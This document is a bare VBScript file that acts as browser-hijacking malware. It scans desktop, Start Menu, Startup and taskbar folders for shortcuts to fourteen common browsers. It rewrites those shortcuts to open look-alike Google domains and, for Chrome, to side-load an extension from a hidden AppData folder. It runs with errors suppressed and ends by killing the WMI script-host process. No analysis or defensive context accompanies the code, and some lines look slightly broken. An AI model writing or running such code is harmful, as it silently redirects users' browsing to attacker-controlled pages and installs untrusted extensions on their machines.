Dim objFS:Set objFS = CreateObject("Scripting.FileSystemObject")
On Error Resume Next
Const link = "http://9oogle.com/"
Const linkChrome = " --load-extension=""C:\Users\{username}1\AppData\Local\kemgadeojglibflomicgnfeopkdfflnk"" http://9o0gle.com/"
browsers = Array("IEXPLORE.EXE", "firefox.exe", "360SE.exe", "SogouExplorer.exe", "opera.exe", "Safari.exe", "Maxthon.exe", "TTraveler.exe", "TheWorld.exe", "baidubrowser.exe", "liebao.exe", "QQBrowser.exe","chrome.exe","360chrome.exe")
ChromeBrowsers = Array("chrome.exe","360chrome.exe")
Set BrowserDic = CreateObject("scripting.dictionary")
For Each browser In browsers
  BrowserDic.Add LCase(browser), browser
Next
Set ChromeBrowserDic = CreateObject("scripting.dictionary")
For Each ChromeBrowser In ChromeBrowsers
  ChromeBrowserDic.Add LCase(ChromeBrowser), ChromeBrowsers
Next
Dim FoldersDic(12)
Set WshShell = CreateObject("Wscript.Shell")
FoldersDic(0) = "C:\Users\Public\Desktop"
FoldersDic(1) = "C:\ProgramData\Microsoft\Windows\Start Menu"
FoldersDic(2) = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs"
FoldersDic(3) = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
FoldersDic(4) = "C:\Users\{username}\Desktop"
FoldersDic(5) = "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu"
FoldersDic(6) = "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
FoldersDic(7) = "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
FoldersDic(8) = "C:\Users\{username}\AppData\Roaming"
FoldersDic(9) = "C:\Users\{username}\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch"
FoldersDic(10) = "C:\Users\{username}\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu"
FoldersDic(11) = "C:\Users\{username}\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"

Set fso = CreateObject("Scripting.Filesystemobject")
For i = 0 To UBound(FoldersDic)
  For Each file In fso.GetFolder(FoldersDic(i)).Files
    If LCase(fso.GetExtensionName(file.Path)) = "lnk" Then
      WScript.Echo(file)
      set oShellLink = WshShell.CreateShortcut(file.Path)
      path = oShellLink.TargetPathx
      name = fso.GetBaseName(path) & "." & fso.GetExtensionName(path)
      If BrowserDic.Exists(LCase(name)) Then
        If ChromeBrowserDic.Exists(LCase(name)) Then
          oShellLink.Arguments = linkChrome
        else
          oShellLink.Arguments = link
        End if
        If file.Attributes And 1 Then
          
        End If
        oShellLink.Save
      End If
    End If
  Next
Next
createobject("wscript.shell").run "cmd /c taskkill /f /im scrcons.exe", 0